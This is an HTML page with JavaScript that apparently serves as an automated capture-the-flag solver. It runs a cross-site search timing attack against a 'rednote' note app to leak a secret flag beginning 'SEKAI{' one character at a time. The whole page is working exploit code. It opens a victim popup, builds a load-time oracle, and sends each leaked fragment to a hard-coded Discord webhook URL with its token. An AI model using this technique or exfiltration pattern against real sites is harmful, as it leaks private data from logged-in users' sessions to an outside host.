<!doctype html>
<meta charset="utf-8" />
<title>rednote XS-Search solver (auto)</title>
<style>
  body{font:14px/1.5 system-ui,-apple-system,Segoe UI,Roboto,Arial;max-width:900px;margin:2rem auto}
  pre{background:#f6f6f6;border-radius:10px;padding:14px}
  .ok{color:#0a7}.warn{color:#d70}.err{color:#d33}
</style>
<pre id="log">starting…</pre>
<script>
/* =========================== CONFIG =========================== */
const ORIGIN = "http://rednote:1337";
const SEARCH_ENDPOINT = "/search";
const PARAM_CANDIDATES = ["query", "q"];   // we'll auto-pick
const START_PREFIX = "SEKAI{";
const STOP_CHAR = "}";
const ORDERED_CHARS = [
  "}", "e","t","a","o","i","n","s","r","h","d","l","c","u","m",
  "w","f","g","y","p","b","v","k","j","x","q","z","_"
];
const PACE_MS = 1050;     // ~1 req/sec to respect 4 req / 4s
const MAX_CHARS = 64;     // safety cap
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1382334613845840002/SX5hbHiHJO3xp5CsBGhgsPNzWfMEOagKkW8lr7ESxZfSzO718u1UNKm-YFk8EpxaDgVI";

/* ======================== helpers / logging =================== */
const $log = document.getElementById("log");
const log  = (...a)=>($log.textContent += a.join(" ") + "\n");
const sleep = ms => new Promise(r => setTimeout(r, ms));
function sendDiscord(text){
  const payload = JSON.stringify({ content: text });
  const blob = new Blob([payload], { type: "application/json" });
  const ok = navigator.sendBeacon(DISCORD_WEBHOOK, blob);
  if (!ok) fetch(DISCORD_WEBHOOK, { method:"POST", headers:{ "Content-Type":"application/json" }, body: payload, keepalive:true }).catch(()=>{});
}

/* Make sure you see *something* the moment the bot lands here */
sendDiscord("[bluenote] hello — page opened, starting");

/* ====================== popup + timing primitive =============== */
function openVictimPopup(){
  const w = window.open("about:blank", "victim", "width=900,height=700");
  if (!w) throw new Error("Popup blocked; allow popups for this page.");
  return w;
}
async function timeNav(win, url){
  return await new Promise(resolve=>{
    const start = performance.now();
    win.onload = () => resolve(performance.now() - start);
    win.location = url + (url.includes("?") ? "&" : "?") + "_t=" + Math.random();
  });
}
function buildSearchURL(param, q){
  const u = new URL(ORIGIN + SEARCH_ENDPOINT);
  u.searchParams.set(param, q);
  return u.toString();
}

/* =============== auto-pick param + calibrate oracle ============ */
async function calibrate(win){
  let best = null;
  for (const param of PARAM_CANDIDATES){
    // HIT: known prefix exists; MISS: nonsense
    const hitQ  = START_PREFIX;
    const missQ = "__not_present__";

    const tH1 = await timeNav(win, buildSearchURL(param, hitQ));  await sleep(PACE_MS);
    const tH2 = await timeNav(win, buildSearchURL(param, hitQ));  await sleep(PACE_MS);
    const tHit = Math.min(tH1, tH2);

    const tM1 = await timeNav(win, buildSearchURL(param, missQ)); await sleep(PACE_MS);
    const tM2 = await timeNav(win, buildSearchURL(param, missQ)); await sleep(PACE_MS);
    const tMiss = Math.min(tM1, tM2);

    const diff = Math.abs(tHit - tMiss);
    const hitIsSlower = tHit > tMiss;
    const threshold = (tHit + tMiss) / 2;
    log(`calibration[${param}] → HIT≈${tHit.toFixed(1)}ms  MISS≈${tMiss.toFixed(1)}ms  diff=${diff.toFixed(1)} hitIsSlower=${hitIsSlower}`);

    if (!best || diff > best.diff) best = { param, diff, hitIsSlower, threshold };
  }
  if (!best) throw new Error("calibration failed");
  if (best.diff < 8) log(".warn timing oracle is weak; proceeding anyway");
  sendDiscord(`[bluenote] using param=${best.param} (hitIsSlower=${best.hitIsSlower}, diff≈${best.diff.toFixed(1)}ms)`);
  return best;
}
function makeHitTest(threshold, hitIsSlower){
  return (t) => hitIsSlower ? (t > threshold) : (t < threshold);
}

/* ============================ main ============================ */
async function solve(){
  try{
    const win = openVictimPopup();
    log("popup opened; calibrating…");
    const { param, hitIsSlower, threshold } = await calibrate(win);
    const isHit = makeHitTest(threshold, hitIsSlower);

    let flag = START_PREFIX;
    sendDiscord(`[bluenote] start: ${flag}`);

    outer: for (let i=0; i<MAX_CHARS; i++){
      let chosen = null, rec = [];
      for (const ch of ORDERED_CHARS){
        const q = flag + ch;
        const t = await timeNav(win, buildSearchURL(param, q));
        await sleep(PACE_MS);
        rec.push([ch, t]);
        if (isHit(t)) { chosen = ch; break; }
      }
      if (!chosen){
        // noisy fallback: choose based on calibrated direction
        rec.sort((a,b)=>a[1]-b[1]);
        chosen = hitIsSlower ? rec.at(-1)[0] : rec[0][0];
        log(".warn noisy step; fallback picked:", chosen, JSON.stringify(rec.map(([c,t])=>[c, t.toFixed(0)])));
      }
      flag += chosen;
      log(".ok →", flag, `(picked '${chosen}')`);
      sendDiscord(`[bluenote] progress: ${flag}`);
      if (chosen === STOP_CHAR || flag.endsWith(STOP_CHAR)) break outer;
    }

    log("\nFINAL:", flag);
    sendDiscord(`[bluenote] FINAL: ${flag}`);

  } catch(e){
    log(".err", e && (e.stack || e));
    sendDiscord(`[bluenote] error: ${e && (e.message || e)}`);
  }
}
solve();
</script>
